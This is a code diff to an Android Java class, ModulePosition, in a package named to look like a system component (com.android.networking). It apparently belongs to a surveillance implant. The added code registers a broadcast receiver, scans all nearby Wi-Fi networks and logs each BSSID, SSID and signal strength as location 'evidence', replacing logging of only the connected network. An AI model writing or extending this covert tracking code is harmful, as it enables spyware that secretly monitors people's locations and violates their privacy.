@@ -10,17 +10,24 @@
 package com.android.networking.module;
 
 import java.util.Date;
+import java.util.List;
 
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.location.Location;
 import android.location.LocationListener;
+import android.net.wifi.ScanResult;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 
 import com.android.networking.CellInfo;
+import com.android.networking.Core;
 import com.android.networking.Device;
 import com.android.networking.LogR;
+import com.android.networking.ServiceCore;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
@@ -57,6 +64,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 	private Object logGPSlock = new Object();
 	private Object logCelllock = new Object();
 	private Object logWifilock = new Object();
+	private boolean scanning;
 
 	@Override
 	public void actualStart() {
@@ -152,27 +160,10 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			Check.log(TAG + " (locationWIFI)");
 		}
 		final WifiManager wifiManager = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
-
-		final WifiInfo wifi = wifiManager.getConnectionInfo();
-
-		if (wifi != null && wifi.getBSSID() != null) {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "Wifi: " + wifi.getBSSID());//$NON-NLS-1$ //$NON-NLS-2$
-			}
-
-			final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(), wifi.getRssi());
-
-			synchronized (logWifilock) {
-				new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(1, LOG_TYPE_WIFI), payload);
-			}
-
-			// logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
-			// EvidenceType.LOCATION_NEW);
-			// logWifi.writeEvidence(payload);
-			// logWifi.close();
+		if (wifiManager != null && wifiManager.isWifiEnabled()) {
+			registerWifiScan(wifiManager);
+			wifiManager.startScan();
 		} else {
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Warn: " + "Wifi disabled");//$NON-NLS-1$ //$NON-NLS-2$
 			}
@@ -369,6 +360,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		}
 
 		return payload;
+		// return messageEvidence(payload,LOG_TYPE_WIFI);
 	}
 
 	private byte[] getCellPayload(CellInfo info, int logType) {
@@ -524,4 +516,51 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		}
 	}
 
+	public void registerWifiScan(final WifiManager wifiManager) {
+		if (scanning)
+			return;
+		scanning = true;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (registerWifi)");
+		}
+		final IntentFilter scanFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
+		BroadcastReceiver wifiReceiver = new BroadcastReceiver() {
+			@Override
+			public void onReceive(Context context, Intent intent) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive)");
+				}
+				scanning = false;
+				List<ScanResult> results = wifiManager.getScanResults();
+				onWifiScan(results);
+
+			}
+		};
+
+		Status.getAppContext().registerReceiver(wifiReceiver, scanFilter);
+	}
+
+	public void onWifiScan(List<ScanResult> results) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onWifiScan)");
+		}
+
+		synchronized (logWifilock) {
+			LogR logWifi = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(results.size(),
+					LOG_TYPE_WIFI));
+
+			for (ScanResult wifi : results) {
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: " + "Wifi: " + wifi.BSSID);//$NON-NLS-1$ //$NON-NLS-2$
+				}
+
+				final byte[] payload = getWifiPayload(wifi.BSSID, wifi.SSID, wifi.level);
+				logWifi.write(payload);
+
+			}
+
+			logWifi.close();
+		}
+	}
 }
